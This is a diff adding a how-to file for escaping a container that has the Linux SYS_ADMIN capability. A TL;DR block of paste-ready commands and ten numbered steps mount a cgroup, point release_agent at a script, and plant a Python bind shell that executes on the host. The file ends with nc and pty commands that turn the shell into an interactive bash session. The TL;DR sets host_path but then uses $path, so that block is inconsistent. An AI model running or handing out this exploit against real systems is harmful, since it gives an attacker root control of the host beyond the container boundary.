@@ -1,0 +1,102 @@
+Compromising underlying OS using SYS_ADMIN linux capability.
+
+TL;DR
+
+Paste the following commands in container C2 and jump to step 8.
+
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child
+echo 1 > /tmp/cgrp/child/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$path/exploit" > /tmp/cgrp/release_agent
+echo "#!/bin/sh" > /exploit
+echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"
+
+
+Background: 
+
+Sometimes containers need to be run with extra privileges to perform some operations on the host operating system itself. These containers are run with --privileged flag which adds some special capabilities to the running container, however, it is not considered a best practice for the security of the system. Any user (or attacker) having access to the container can easily elevate his/her access to the underlying operating system.
+
+As a remediation of the above issue, containers are run with the specific capability (whichever is needed) instead of running it as a privileged container (which possess all the capabilities). These capabilities can be listed with capsh --print command.
+
+In this attack scenario, Container C2 is also running with the such capability SYS_ADMIN. Basically, SYS_ADMIN capability allows the container to perform system administration operations such as  quotactl, mount, umount, swapon, swapoff, sethostname, and setdomainname. Although, not running a container as a privileged one, decreases the security risk however these specific capabilities can also be exploited by issuing some commands and access to the underlying operating system can be gained. 
+
+
+Terminology:
+
+cgroup: A control group is a linux kernel feature, used in docker environments, to isolate the resources for a group of processes, so that it does not interfere with each other's resources.
+
+release_agent: it is script which is supposed to run when the last process in a cgroups terminates.
+
+notify_on_release: it is flag to notify the linux kernel to invoke release_agent , when the last process in a cgroup terminates. By default this flag is disabled (0).
+
+/etc/mtab : it is a list of currently mounted filesystems.
+
+sh -c "echo \$\$" : This command prints the PID of sh (or any other) process.
+
+Onjective:
+
+We will try to create a cgroup and a child cgroup and then terminates it processes to invoke release_agent by enabling notify_on_release.
+
+
+Steps:
+
+1. Create a directory and mount RDMA cgroup controller and then create a child cgroup 'child'.
+
+	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child
+
+2. Enable notify_on_release flag.
+
+	echo 1 > /tmp/cgrp/child/notify_on_release
+	
+3. Since /etc/mtab file contains currently mounted file systems (cgroup is one of them), store the full path of the cgroup (from underlying OS), in a variable called path.
+
+	path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`	
+
+4. Save the path appended with a file named 'exploit' (which will contain actual payload) into release_agent, so that it gets executed when invoked.
+
+	echo "$path/exploit" > /tmp/cgrp/release_agent
+	
+5. Now write actual payload, which is a bind shell, into exploit file. We tried writing reverse shell into the payload however it always ended up with a broken pipe on netcat listener, therefore we are using bind shell.
+
+	echo "#!/bin/sh" > /exploit
+	echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit
+	
+	So, its a bind shell written in python which will open port 1337 for connections on operating system's IP.
+
+6. Make the exploit file executable
+
+	chmod a+x /exploit
+
+7. Now we will spawn a dummy process inside child cgroup, which will end immediately and hence release_agent will be triggered inside operating system, and our payload will be executed.
+
+	
+	sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"
+	
+8. Now, check the status of port 1337 by scanning the IP of the operating system
+
+	nmap -Pn 192.168.2.44 -p 1337
+	
+You could see the status is open. Now is the time to connect to the bind shell which is waiting for our connection.
+
+9. Use netcat to connect to the port 1337
+
+
+	nc 192.168.2.44 1337
+	
+10. Once you are connected to the socket, spawn a bash shell using following snippet, then press ctrl+D to send EOF signal.
+
+	import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()
+
+and BOOM! You got access to the operating system.
+
+
+
+
+	
+
+
+
+
+
